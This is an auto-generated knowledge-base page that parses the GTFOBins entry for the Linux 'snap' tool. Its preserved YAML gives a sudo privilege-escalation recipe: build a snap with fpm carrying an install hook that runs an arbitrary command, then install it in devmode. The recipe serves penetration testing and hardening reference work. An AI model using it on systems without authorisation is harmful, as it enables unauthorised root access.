---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# snap

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `snap` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/snap` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [snap](../../tools/linux/snap.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | snap |
| name | snap |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/snap/ |

## Preserved Source Material

````yaml
_body: ''
_name: snap
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/snap
functions:
  command:
  - code: snap install xxxx_1.0_all.snap --dangerous --devmode
    comment: 'Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.


      ```

      mkdir -p meta/hooks

      echo -e ''#!/bin/sh\n/path/to/command; false'' >meta/hooks/install

      chmod +x meta/hooks/install

      fpm -n xxxx -s dir -t snap -a all meta

      ```'
    contexts:
      sudo: null
````
